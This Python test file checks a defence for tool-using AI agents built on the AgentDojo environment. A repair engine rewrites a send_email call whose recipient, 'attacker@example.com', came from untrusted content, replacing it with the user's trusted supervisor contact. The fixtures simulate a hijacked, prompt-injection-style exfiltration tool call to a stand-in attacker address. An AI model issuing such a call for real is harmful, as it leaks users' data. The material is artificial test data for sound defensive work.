import datetime

import pytest

from agentdojo.default_suites.v1.tools.calendar_client import Calendar
from agentdojo.default_suites.v1.tools.cloud_drive_client import CloudDrive
from agentdojo.default_suites.v1.tools.email_client import EmailContact, Inbox, search_contacts_by_name
from agentdojo.functions_runtime import FunctionCall, FunctionsRuntime, TaskEnvironment

from safeconfirm.config.loader import SafeConfirmConfig
from safeconfirm.execution.repair_engine import RepairEngine
from safeconfirm.types.models import CriticalSlotModel, InterventionRecordModel, SlotSourceRecordModel, SourceTrust


class RepairTestEnvironment(TaskEnvironment):
    inbox: Inbox
    calendar: Calendar
    cloud_drive: CloudDrive


@pytest.fixture
def workspace_env():
    return RepairTestEnvironment(
        inbox=Inbox(
            account_email="user@example.com",
            initial_emails=[],
            contact_list=[EmailContact(name="Supervisor", email="supervisor@university.edu")],
        ),
        calendar=Calendar(
            current_day=datetime.date(2024, 1, 1),
            account_email="user@example.com",
            initial_events=[],
        ),
        cloud_drive=CloudDrive(
            account_email="user@example.com",
            initial_files=[],
        ),
    )


@pytest.fixture
def runtime():
    functions_runtime = FunctionsRuntime([])
    functions_runtime.register_function(search_contacts_by_name)
    return functions_runtime


def _repair_record(role_label: str = "supervisor") -> InterventionRecordModel:
    slot = CriticalSlotModel(
        name="recipients",
        value=["attacker@example.com"],
        value_normalized="attacker@example.com",
        slot_type="email_list",
        risk_weight=1.0,
        role_label=role_label,
    )
    slot_record = SlotSourceRecordModel(
        slot=slot,
        source=SourceTrust.UNTRUSTED_OBSERVATION,
        evidence=[],
        authorization_gap=True,
        risk_score=1.0,
    )
    return InterventionRecordModel(
        tool_call_id="call_1",
        tool_name="send_email",
        tool_args={
            "recipients": ["attacker@example.com"],
            "subject": "Summary",
            "body": "summary",
        },
        critical_slots=[slot],
        slot_records=[slot_record],
        has_untrusted_binding=True,
        has_role_only_binding=True,
        overall_risk=1.0,
        candidates_considered=["REPAIR"],
        selected_intervention="REPAIR",
        policy_backend="rule_v1",
    )


def test_contact_lookup_rebinds_recipient(runtime, workspace_env):
    engine = RepairEngine(SafeConfirmConfig.load())
    tool_call = FunctionCall(
        function="send_email",
        args={"recipients": ["attacker@example.com"], "subject": "Summary", "body": "summary"},
        id="call_1",
    )
    outcome = engine.attempt_repair(tool_call, _repair_record(), runtime, workspace_env)

    assert outcome.success is True
    assert outcome.tool_call is not None
    assert outcome.tool_call.args["recipients"] == ["supervisor@university.edu"]
    assert outcome.trusted_emails == {"supervisor@university.edu"}


def test_contact_lookup_fails_without_role_label(runtime, workspace_env):
    engine = RepairEngine(SafeConfirmConfig.load())
    tool_call = FunctionCall(
        function="send_email",
        args={"recipients": ["attacker@example.com"], "subject": "Summary", "body": "summary"},
        id="call_1",
    )
    record = _repair_record()
    record.slot_records[0].slot.role_label = None

    outcome = engine.attempt_repair(tool_call, record, runtime, workspace_env)

    assert outcome.success is False
    assert outcome.reason == "missing_role_label"


def test_contact_lookup_fails_when_lookup_tool_missing(workspace_env):
    engine = RepairEngine(SafeConfirmConfig.load())
    tool_call = FunctionCall(
        function="send_email",
        args={"recipients": ["attacker@example.com"], "subject": "Summary", "body": "summary"},
        id="call_1",
    )

    outcome = engine.attempt_repair(tool_call, _repair_record(), FunctionsRuntime([]), workspace_env)

    assert outcome.success is False
    assert outcome.reason == "lookup_tool_unavailable"
